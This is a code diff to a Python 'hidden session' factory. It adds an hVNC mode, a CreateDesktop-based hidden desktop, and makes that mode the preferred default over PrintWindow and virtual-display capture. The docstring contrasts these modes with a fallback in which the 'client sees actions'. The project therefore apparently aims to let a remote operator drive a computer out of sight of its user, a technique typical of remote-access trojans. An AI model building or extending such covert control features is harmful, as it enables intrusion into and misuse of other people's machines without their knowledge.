@@ -1407,18 +1407,33 @@ def create_hidden_session(mode: str = "auto", **kwargs):
     """Factory function to create appropriate hidden session.
     
     Args:
-        mode: Session mode - "auto", "printwindow", "virtual_display", or "fallback"
+        mode: Session mode - "auto", "hvnc", "printwindow", "virtual_display", or "fallback"
         **kwargs: Additional arguments passed to session constructor
     
     Returns:
-        Session instance (HiddenWindowSession or HiddenDesktopSession)
+        Session instance (HVNCSessionWrapper, HiddenWindowSession, or HiddenDesktopSession)
     
     Modes:
-        - "auto": Try PrintWindow first (no driver needed), then virtual display
-        - "printwindow": Use PrintWindow API (recommended, no driver)
+        - "auto": Try hVNC first (true hidden desktop), then PrintWindow, then virtual display
+        - "hvnc": Use CreateDesktop API for true hidden desktop (recommended)
+        - "printwindow": Use PrintWindow API with offscreen windows
         - "virtual_display": Use VDD driver (requires installation)
         - "fallback": Capture from primary monitor (client sees actions)
     """
+    # Try to import hVNC
+    hvnc_available = False
+    try:
+        from .hvnc_track import HVNCSessionWrapper, HVNC_AVAILABLE
+        hvnc_available = HVNC_AVAILABLE
+    except ImportError:
+        pass
+    
+    if mode == "hvnc":
+        if not hvnc_available:
+            raise RuntimeError("hVNC mode not available")
+        from .hvnc_track import HVNCSessionWrapper
+        return HVNCSessionWrapper(**kwargs)
+    
     if mode == "printwindow":
         if not PRINTWINDOW_AVAILABLE:
             raise RuntimeError("PrintWindow mode not available")
@@ -1430,13 +1445,23 @@ def create_hidden_session(mode: str = "auto", **kwargs):
     if mode == "fallback":
         return HiddenDesktopSession(use_virtual_display=False, **kwargs)
     
-    # Auto mode: try PrintWindow first (no driver needed), then virtual display
+    # Auto mode: try hVNC first, then PrintWindow, then virtual display
     if mode == "auto":
-        # First try PrintWindow mode - no driver required
+        # First try hVNC mode - true hidden desktop, no driver required
+        if hvnc_available:
+            try:
+                from .hvnc_track import HVNCSessionWrapper
+                session = HVNCSessionWrapper(**kwargs)
+                logger.info("Using hVNC mode (CreateDesktop hidden desktop)")
+                return session
+            except Exception as exc:
+                logger.warning("hVNC session failed: %s, trying PrintWindow", exc)
+        
+        # Second try PrintWindow mode - no driver required
         if PRINTWINDOW_AVAILABLE:
             try:
                 session = HiddenWindowSession(**kwargs)
-                logger.info("Using PrintWindow mode (no driver required)")
+                logger.info("Using PrintWindow mode (offscreen windows)")
                 return session
             except Exception as exc:
                 logger.warning("PrintWindow session failed: %s, trying virtual display", exc)
